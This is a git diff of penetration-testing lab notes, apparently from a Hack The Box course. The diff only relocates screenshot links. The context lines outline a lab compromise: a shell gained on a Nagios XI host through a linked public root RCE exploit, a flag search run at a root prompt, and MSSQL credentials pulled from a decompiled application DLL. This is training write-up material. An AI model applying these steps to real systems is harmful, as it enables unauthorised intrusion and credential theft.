-![Screenshot_2026-05-27_23_36_17.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-27_23_36_17.png)
+![Screenshot_2026-05-27_23_36_17.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/Screenshot_2026-05-27_23_36_17.png)
 
 ### Known vulnerability
 
@@ -4358,15 +4358,15 @@ the blog vhost runs a wordpress
 
 the application running on monitoring vhost:
 
-![Screenshot_2026-05-28_01_01_11.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-28_01_01_11.png)
+![Screenshot_2026-05-28_01_01_11.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/Screenshot_2026-05-28_01_01_11.png)
 
-![Screenshot_2026-05-28_01_27_30.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-28_01_27_30.png)
+![Screenshot_2026-05-28_01_27_30.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/Screenshot_2026-05-28_01_27_30.png)
 
 optaining shell https://github.com/sarcastic-rant/nagiosxi-root-rce-exploit/tree/master
 
-![Screenshot_2026-05-28_02_02_12.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-28_02_02_12.png)
+![Screenshot_2026-05-28_02_02_12.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/Screenshot_2026-05-28_02_02_12.png)
 
-![Screenshot_2026-05-28_02_24_43.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-28_02_24_43.png)
+![Screenshot_2026-05-28_02_24_43.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/Screenshot_2026-05-28_02_24_43.png)
 
 ```jsx
 root@skills2:/# find / -name *flag* 2>/dev/null | grep txt
@@ -4385,4 +4385,4 @@ C:\inetpub\wwwroot\bin
 
 then uesed dnSpy to decompile it, and found the credentails for MSSQL service stored in the file
 
-![Screenshot_2026-05-29_12_04_30.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/2f5c747d-2da7-42a4-b454-34da25a56054.png)
+![Screenshot_2026-05-29_12_04_30.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/2f5c747d-2da7-42a4-b454-34da25a56054.png)
